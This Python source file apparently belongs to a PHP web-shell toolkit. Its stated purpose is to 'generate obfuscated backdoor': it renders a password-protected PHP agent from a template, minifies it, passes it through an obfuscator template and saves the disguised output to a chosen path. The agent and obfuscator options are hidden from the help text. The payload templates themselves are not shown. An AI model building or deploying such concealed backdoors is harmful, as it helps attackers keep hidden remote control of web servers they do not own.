#!/usr/bin/env python

"""Generate obfuscated backdoor."""

from mako.template import Template
from core.weexceptions import FatalException
from core.loggers import log
from core.config import agent_templates_folder_path, obfuscators_templates_folder_path
from core import helpparse
from core import messages
import utils
import os
import sys
import glob

def generate(password, obfuscator = 'obfusc1_php', agent = 'stegaref_php'):

    obfuscator_path = os.path.join(
        obfuscators_templates_folder_path,
        obfuscator +
        '.tpl')
    agent_path = os.path.join(agent_templates_folder_path, agent + '.tpl')

    for path in (obfuscator_path, agent_path):
        if not os.path.isfile(path):
            raise FatalException(messages.generic.file_s_not_found % path)

    obfuscator_template = Template(filename=obfuscator_path)

    try:
        agent = Template(
            open(
                agent_path,
                'r').read()).render(
            password=password)
    except Exception as e:
        raise FatalException(
            messages.generate.error_agent_template_s_s %
            (agent_path, str(e)))

    agent = utils.code.minify_php(agent)

    try:
        obfuscated = obfuscator_template.render(agent=agent)
    except Exception as e:
        raise FatalException(
            messages.generate.error_obfuscator_template_s_s %
            (obfuscator_path, str(e)))

    return obfuscated


def save_generated(obfuscated, output):

    try:
        open(output, 'w+').write(obfuscated)
    except Exception as e:
        raise FatalException(
            messages.generic.error_creating_file_s_s %
            (output, e))

if __name__ == '__main__':

    agents_available = [
        os.path.split(agent)[1].split('.')[0] for agent in
        glob.glob('%s/*.tpl' % agent_templates_folder_path)
    ]

    obfuscators_available = [
        os.path.split(agent)[1].split('.')[0] for agent in
        glob.glob('%s/*.tpl' % obfuscators_templates_folder_path)
    ]

    # HelpParser is a slightly changed `ArgumentParser`
    argparser = helpparse.HelpParser(description = __doc__)
    argparser.add_argument('password', help = 'The agent password')
    argparser.add_argument('path', help = 'Where save the generated agent')
    argparser.add_argument(
        '-obfuscator',
        help = helpparse.SUPPRESS, #The obfuscation method
        choices = obfuscators_available,
        default = 'obfusc1_php'
        )
    argparser.add_argument(
        '-agent',
        help = helpparse.SUPPRESS, #The agent channel type
        choices = agents_available,
        default = 'stegaref_php'
        )

    args = argparser.parse_args()

    obfuscated = generate(
        password = args.password,
        obfuscator = args.obfuscator,
        agent = args.agent
    )

    save_generated(obfuscated, args.path)

    log.info(
        messages.generate.generated_backdoor_with_password_s_in_s_size_i %
        (args.password, args.path, len(obfuscated)))
